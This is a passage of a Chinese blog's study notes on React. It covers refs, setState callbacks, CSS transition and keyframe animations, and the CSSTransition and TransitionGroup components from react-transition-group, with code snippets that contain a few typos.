</span><br><span class="line">            		value=&#123;<span class="keyword">this</span>.state.inputValue&#125; </span><br><span class="line">            		onChange=&#123;<span class="keyword">this</span>.handlerInputChange&#125;</span><br><span class="line">            		<span class="comment">//这里第一个括号里的input可以任意命名，大括号里的等号后边input就是这个input标签，</span></span><br><span class="line">            		ref=&#123;(input)=&gt;&#123;<span class="keyword">this</span>.input=input&#125;&#125;/&gt;</span><br><span class="line">		      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">		      &lt;ul&gt;&#123;this.getTodoItems()&#125;&lt;/u</span>l&gt;</span><br><span class="line">		   &lt;<span class="regexp">/Fragment&gt;</span></span><br><span class="line"><span class="regexp">	    );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">handlerInputChange(event)&#123;</span></span><br><span class="line"><span class="regexp">    	/</span><span class="regexp">/这里就可以直接使用ref了</span></span><br><span class="line"><span class="regexp">		const value=this.input.value;</span></span><br><span class="line"><span class="regexp">		this.setState(&#123;</span></span><br><span class="line"><span class="regexp">			inputValue:value</span></span><br><span class="line"><span class="regexp">		&#125;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>注意直接操作dom对于新手有时会出现意想不到的效果，比如当我们每次点击按钮时项计算一下当前ul中的li的个数，通常会这么做</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">	    <span class="keyword">return</span> (</span><br><span class="line">		    &lt;Fragment&gt;</span><br><span class="line">		      &lt;div&gt;</span><br><span class="line">		      	&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handlerInputChange&#125;/&gt;</span><br><span class="line">		      	&lt;button </span><br><span class="line">            		className=<span class="string">'red-btn'</span> </span><br><span class="line">            		onClick=&#123;<span class="keyword">this</span>.handlerBtnClick&#125;</span><br><span class="line">            		&gt;add&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">		      &lt;/</span>div&gt;</span><br><span class="line">		      &lt;ul ref=&#123;(ul)=&gt;&#123;<span class="keyword">this</span>.ul=ul&#125;&#125;&gt;&#123;<span class="keyword">this</span>.getTodoItems()&#125;&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">		   &lt;/</span>Fragment&gt;</span><br><span class="line">	    );</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line">      handlerBtnClick()&#123;</span><br><span class="line">		<span class="keyword">this</span>.setState(&#123;</span><br><span class="line">			list:[...this.state.list,<span class="keyword">this</span>.state.inputValue],</span><br><span class="line">			inputValue:<span class="string">""</span></span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>.ul.querySelectorAll(<span class="string">"div"</span>).length);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这是你会发现，每次输出的数量都会比实际的要少1，为什么呢？这是因为setState是异步函数，每次还没更新页面你的console就已经执行了，这时如何避免这种情况呢？</p>
<p>setState第二个参数提供了回调函数，供我们使用，这样就能正常获取正确的数值了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">handlerBtnClick()&#123;</span><br><span class="line">		<span class="keyword">this</span>.setState(&#123;</span><br><span class="line">			list:[...this.state.list,<span class="keyword">this</span>.state.inputValue],</span><br><span class="line">			inputValue:<span class="string">""</span></span><br><span class="line">        &#125;,&#123;&#125;=&gt;&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.ul.querySelectorAll(<span class="string">"div"</span>).length);</span><br><span class="line">        &#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>本笔记参考慕课网视频<a href="https://coding.imooc.com/class/229.html" target="_blank" rel="noopener">https://coding.imooc.com/class/229.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/29/react组件细节/" data-id="ck55it3ml0034cglry5hyhmcv" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-react中的css" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/29/react中的css/" class="article-date">
  <time datetime="2018-08-29T15:02:46.000Z" itemprop="datePublished">2018-08-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/29/react中的css/">react中的css</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="3、react中的css"><a href="#3、react中的css" class="headerlink" title="3、react中的css"></a>3、react中的css</h3><h4 id="3-1-react中的css过度动画"><a href="#3-1-react中的css过度动画" class="headerlink" title="3.1 react中的css过度动画"></a>3.1 react中的css过度动画</h4><p>下面我们实现一个过渡动画效果，页面一个文字，一个按钮，点击按钮则文字逐渐消失，再点击，文字逐渐显示。</p>
<blockquote>
<p>1、新建一个react组件APP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> React &#123; Component , Fragment&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line">&gt; <span class="keyword">import</span> <span class="string">'./App.css'</span>;<span class="comment">//引入css文件</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">&gt;     <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">&gt;         <span class="keyword">super</span>(props);</span><br><span class="line">&gt;         <span class="keyword">this</span>.state=&#123;</span><br><span class="line">&gt;             show:<span class="literal">true</span></span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;         <span class="keyword">this</span>.handleToggole=<span class="keyword">this</span>.handleToggole.bind(<span class="keyword">this</span>);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     render()&#123;</span><br><span class="line">&gt;         <span class="keyword">return</span> (&#123;</span><br><span class="line">&gt;             <span class="xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line"><span class="xml">&gt;             	<span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;this.state.show?</span>'<span class="attr">show</span>'<span class="attr">:</span>'<span class="attr">hide</span>'&#125;&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&gt;             	&lt;button onClick=&#123;this.handleToggole&#125;&gt;tonggle&lt;button&gt;</span><br><span class="line">&gt;             &lt;/Fragment&gt;</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     handleToggole()&#123;</span><br><span class="line">&gt;         this.setState(&#123;</span><br><span class="line">&gt;    			//若为true则变成false，若为false则变成true</span><br><span class="line">&gt;             show:this.state.show?false:true;</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>2、新建App.css，定义show和hide的样式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; .show &#123;</span><br><span class="line">&gt;     opacity:<span class="number">1</span>;</span><br><span class="line">&gt;     transition:all <span class="number">1</span>s ease-<span class="keyword">in</span>;<span class="comment">//css3的动画样式，在1s内实现过渡</span></span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; .hide &#123;</span><br><span class="line">&gt;     opacity:<span class="number">0</span></span><br><span class="line">&gt;     transition:all <span class="number">1</span>s ease-<span class="keyword">in</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="3-2-react中的css动画效果"><a href="#3-2-react中的css动画效果" class="headerlink" title="3.2 react中的css动画效果"></a>3.2 react中的css动画效果</h4><p>什么是css的动画效果呢？其实是指通过 @keyframes定义的一些css动画</p>
<p>可以在App.css文件中这个定义并使用动画</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.show &#123;</span><br><span class="line">    opacity:<span class="number">1</span>;</span><br><span class="line">    transition:all <span class="number">1</span>s ease-<span class="keyword">in</span>;<span class="comment">//css3的动画样式，在1s内实现过渡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用动画</span></span><br><span class="line">.hide &#123;</span><br><span class="line">    animation:hide-item <span class="number">2</span>s ease-<span class="keyword">in</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义动画</span></span><br><span class="line">@keyframes hide-item&#123;</span><br><span class="line">    <span class="number">0</span>% &#123;<span class="comment">//当进度为0%时 的状态</span></span><br><span class="line">        opacity:<span class="number">1</span>;</span><br><span class="line">        color:red;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">50</span>% &#123;<span class="comment">//当进度为50%时 的状态</span></span><br><span class="line">        opacity:<span class="number">0.5</span>;</span><br><span class="line">        color:green;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">100</span>% &#123;<span class="comment">//当进度为100%时 的状态</span></span><br><span class="line">        opacity:<span class="number">0</span>;</span><br><span class="line">        color:blue;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是我们的文字具有动画效果了，可是此时会发现问题，当文字动画执行完之后，文字并没有消失，</p>
<p>这是因为，我们动画的最后一帧并没有保存，该怎么做呢，很简单，</p>
<p>只需要在animation最后添加 forwards即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">animation:hide-item <span class="number">2</span>s ease-<span class="keyword">in</span> forwards;</span><br></pre></td></tr></table></figure>
<p>这样就实现了想要效果，同理可以对show样式做同样的处理</p>
<p>到此刻就可以实现纯css3的动画，如果想实现js辅助动画，这种方法就解决不了了。那该如何做呢？可以使用第三方框架</p>
<h4 id="3-3-使用react-transition-group实现动画"><a href="#3-3-使用react-transition-group实现动画" class="headerlink" title="3.3 使用react-transition-group实现动画"></a>3.3 使用react-transition-group实现动画</h4><p>可以使用react-transition-group实现js辅助动画</p>
<h5 id="3-3-1-CSSTransition的css方式实现动画"><a href="#3-3-1-CSSTransition的css方式实现动画" class="headerlink" title="3.3.1 CSSTransition的css方式实现动画"></a>3.3.1 CSSTransition的css方式实现动画</h5><blockquote>
<p>1、首先安装React Transition Group模块，参考<a href="https://reactcommunity.org/react-transition-group/" target="_blank" rel="noopener">React Transition Group</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; # npm</span><br><span class="line">&gt; npm install react-transition-group --save</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>然后重新启动自己的项目</p>
<p>在可以看到有三个组成</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; Transition： <span class="comment">//更底层的组件，当高层组件不够用时才用它</span></span><br><span class="line">&gt; CSSTransition</span><br><span class="line">&gt; TransitionGroup</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>下面首先介绍一下CSSTransition</p>
<p>2、在组件APP中引入CSSTransition，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> &#123; CSSTransition &#125; <span class="keyword">from</span> <span class="string">'react-transition-group'</span>;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>然后在render函数中，就可以使用CSSTransition。只需要将div包裹在CSSTransition标签内就可以，，而不再需要那些自定义的样式，CSSTransition组件会自动的帮我们做一些class名字的增加和移除的工作，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;  render()&#123;</span><br><span class="line">&gt;         <span class="keyword">return</span> (&#123;</span><br><span class="line">&gt;             <span class="xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">&gt;             	&lt;CSSTransition&gt;</span><br><span class="line">&gt;             		//&lt;div className=&#123;this.state.show?'show':'hide'&#125;&gt;hello&lt;/div&gt;</span><br><span class="line">&gt;             		&lt;div&gt;hello&lt;/div&gt;</span><br><span class="line"><span class="xml">&gt;                 <span class="tag">&lt;/<span class="name">CSSTransition</span>&gt;</span></span></span><br><span class="line">&gt;             	&lt;button onClick=&#123;this.handleToggole&#125;&gt;tonggle&lt;button&gt;</span><br><span class="line">&gt;             &lt;/Fragment&gt;</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>3、CSSTransition有一些属性，需要了解下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;  * <span class="keyword">in</span>  ：CSSTransition什么时候感知到样式</span><br><span class="line">&gt;  * timeout : 动画时间 单位毫秒</span><br><span class="line">&gt;  * fade-enter：入场动画将要执行的第一瞬间，还没有执行时，就会被安排在div标签上</span><br><span class="line">&gt;    fade-enter-active：入场动画执行的第二个时刻，到入场动画执行结束之前，就会被安排在div标签上</span><br><span class="line">&gt;    fade-enter-done： 整个入场动画执行完成之后，就会被安排在div标签上</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>对于上面fade属性在使用时，需要设置前缀传给classNames，当然可以使用fade开头，也可以使用其它单词开头</p>
<p>4、入场动画</p>
<p>最终的render函数可以这么写</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; render()&#123;</span><br><span class="line">&gt;         <span class="keyword">return</span> (&#123;</span><br><span class="line">&gt;             <span class="xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">&gt;             	&lt;CSSTransition</span><br><span class="line">&gt;             		in=&#123;this.state.show&#125;</span><br><span class="line">&gt;                 	timeout=&#123;1000&#125;</span><br><span class="line">&gt;                 	classNames='fade'&gt;</span><br><span class="line">&gt;             		&lt;div&gt;hello&lt;/div&gt;</span><br><span class="line"><span class="xml">&gt;                 <span class="tag">&lt;/<span class="name">CSSTransition</span>&gt;</span></span></span><br><span class="line">&gt;             	&lt;button onClick=&#123;this.handleToggole&#125;&gt;tonggle&lt;button&gt;</span><br><span class="line">&gt;             &lt;/Fragment&gt;</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>css文件中这么写</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; .fade-enter &#123;</span><br><span class="line">&gt;     opacity:<span class="number">0</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; .fade-enter-active &#123;</span><br><span class="line">&gt;     opacity:<span class="number">1</span>;</span><br><span class="line">&gt;     transition:opacity <span class="number">1</span>s ease-<span class="keyword">in</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; .fade-enter-done &#123;</span><br><span class="line">&gt;     opacity:<span class="number">1</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>5、出场动画</p>
<p>这时候已经有入场动画了，我们可以把出场动画也给做了，这是就使用fade-exit<code>,</code>fade-exit-active<code>,</code>fade-exit-done</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; * fade-exit:出场动画将要执行的第一瞬间，还没有执行时，就会被安排在div标签上</span><br><span class="line">&gt;   fade-exit-active:出场动画执行的第二个时刻，到出场动画执行结束之前，就会被安排在div标签上</span><br><span class="line">&gt;   fade-exit-done:整个出场动画执行完成之后，就会被安排在div标签上</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>我们只需要在css文件中这么添加，render无需添加任何更新（因为已经有了fade前缀了）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; .fade-exit &#123;</span><br><span class="line">&gt;     opacity:<span class="number">1</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; fade-exit-active &#123;</span><br><span class="line">&gt;     opacity:<span class="number">0</span>;</span><br><span class="line">&gt;     transition:opacity <span class="number">1</span>s ease-<span class="keyword">in</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; fade-exit-done&#123;</span><br><span class="line">&gt;     opacity:<span class="number">0</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>5、消除标签</p>
<p>此时我们的效果是 点击按钮实现文字的消失和再显。</p>
<p>如果我们想实现当文字消失时同时这个div标签也移除，而不是占的位置显示空白</p>
<p>此时我们可以使用unmountOnExit属性，就可以达到目的，最终render函数如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; render()&#123;</span><br><span class="line">&gt;         <span class="keyword">return</span> (&#123;</span><br><span class="line">&gt;             <span class="xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">&gt;             	&lt;CSSTransition</span><br><span class="line">&gt;             		in=&#123;this.state.show&#125;</span><br><span class="line">&gt;                 	timeout=&#123;1000&#125;</span><br><span class="line">&gt;                 	classNames='fade'</span><br><span class="line">&gt;                 	unmountOnExit&gt;</span><br><span class="line">&gt;             		&lt;div&gt;hello&lt;/div&gt;</span><br><span class="line"><span class="xml">&gt;                 <span class="tag">&lt;/<span class="name">CSSTransition</span>&gt;</span></span></span><br><span class="line">&gt;             	&lt;button onClick=&#123;this.handleToggole&#125;&gt;tonggle&lt;button&gt;</span><br><span class="line">&gt;             &lt;/Fragment&gt;</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
</blockquote>
<p>以上时通过css的方式实现动画，CSSTransition还提供了通过js实现动画的方式防范如下</p>
<h5 id="3-3-2-CSSTransition的js方式实现动画"><a href="#3-3-2-CSSTransition的js方式实现动画" class="headerlink" title="3.3.2 CSSTransition的js方式实现动画"></a>3.3.2 CSSTransition的js方式实现动画</h5><p>比如钩子onEntered就是当入场动画结束之后才会被调用，可以作为CSSTransition的属性调用，函数的参数el指的就时div的元素，这就可以实现js控制动画效果了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (&#123;</span><br><span class="line">            &lt;Fragment&gt;</span><br><span class="line">            	&lt;CSSTransition</span><br><span class="line">            		<span class="keyword">in</span>=&#123;<span class="keyword">this</span>.state.show&#125;</span><br><span class="line">                	timeout=&#123;<span class="number">1000</span>&#125;</span><br><span class="line">                	classNames=<span class="string">'fade'</span></span><br><span class="line">                	unmountOnExit</span><br><span class="line">                	onEntered=&#123;(rl)=&gt;&#123;el.style.color=<span class="string">"blue"</span>&#125;&#125;&gt;</span><br><span class="line">            		&lt;div&gt;hello&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/</span>CSSTransition&gt;</span><br><span class="line">            	&lt;button onClick=&#123;<span class="keyword">this</span>.handleToggole&#125;&gt;tonggle&lt;button&gt;</span><br><span class="line">            &lt;<span class="regexp">/Fragment&gt;</span></span><br><span class="line"><span class="regexp">        &#125;);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-3-3-CSSTransition实现首次展示动画"><a href="#3-3-3-CSSTransition实现首次展示动画" class="headerlink" title="3.3.3 CSSTransition实现首次展示动画"></a>3.3.3 CSSTransition实现首次展示动画</h5><p>此时还有一个问题，我们首次展示时，文字并没有动画效果，如何让页面首次展示时也有动画效果呢，很简单，直接在CSSTransition标签中添加appear属性为true即可。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;CSSTransition</span><br><span class="line">         		<span class="keyword">in</span>=&#123;<span class="keyword">this</span>.state.show&#125;</span><br><span class="line">             	timeout=&#123;<span class="number">1000</span>&#125;</span><br><span class="line">             	classNames=<span class="string">'fade'</span></span><br><span class="line">             	unmountOnExit</span><br><span class="line">             	onEntered=&#123;(rl)=&gt;&#123;el.style.color=<span class="string">"blue"</span>&#125;&#125;</span><br><span class="line">                 appear=&#123;<span class="literal">true</span>&#125;&gt;</span><br><span class="line">         		&lt;div&gt;hello&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">             &lt;/</span>CSSTransition&gt;</span><br></pre></td></tr></table></figure>
<p>此时CSSTransition会在div首次展示时添加动画，但是这个动画并不叫fade-enter，而是叫fade-appear，fade-appear-active，所以我们还需要再css中添加它们</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.fade-enter .fade-appear&#123;</span><br><span class="line">    opacity:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.fade-enter-active .fade-appear-active&#123;</span><br><span class="line">    opacity:<span class="number">1</span>;</span><br><span class="line">    transition:opacity <span class="number">1</span>s ease-<span class="keyword">in</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.fade-enter-done &#123;</span><br><span class="line">    opacity:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="3-3-4-CSSTransition的group方式实现动画"><a href="#3-3-4-CSSTransition的group方式实现动画" class="headerlink" title="3.3.4 CSSTransition的group方式实现动画"></a>3.3.4 CSSTransition的group方式实现动画</h4><p>上边我们讲的是针对一个元素的动画，下面讲一下，如何实现多个元素的动画效果。这就需要使用到TransitionGroup了，</p>
<p>1、首先我们引入该组件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; CSSTransition , TransitionGroup&#125; <span class="keyword">from</span> <span class="string">'react-transition-group'</span>;</span><br></pre></td></tr></table></figure>
<p>现在我门state的show不在存储，而已存储一个数组，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.state=&#123;</span><br><span class="line">    list:[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、然后修改render中的动画 标签，注意TransitionGroup还需要配合CSSTransition使用，使用CSSTransition修饰每一个单独的div</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (&#123;</span><br><span class="line">            &lt;Fragment&gt;</span><br><span class="line">            	&lt;TransitionGroup&gt;</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">this</span>.state.list.map(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">                            <span class="keyword">return</span> (</span><br><span class="line">            					&lt;CSSTransition</span><br><span class="line">                                    <span class="keyword">in</span>=&#123;<span class="keyword">this</span>.state.show&#125;</span><br><span class="line">                                    timeout=&#123;<span class="number">1000</span>&#125;</span><br><span class="line">                                    classNames=<span class="string">'fade'</span></span><br><span class="line">                                    unmountOnExit</span><br><span class="line">                                    onEntered=&#123;(rl)=&gt;&#123;el.style.color=<span class="string">"blue"</span>&#125;&#125;</span><br><span class="line">                                    appear=&#123;<span class="literal">true</span>&#125;&gt;</span><br><span class="line">                                	&lt;div key=&#123;index&#125;&gt;&#123;item&#125;&lt;<span 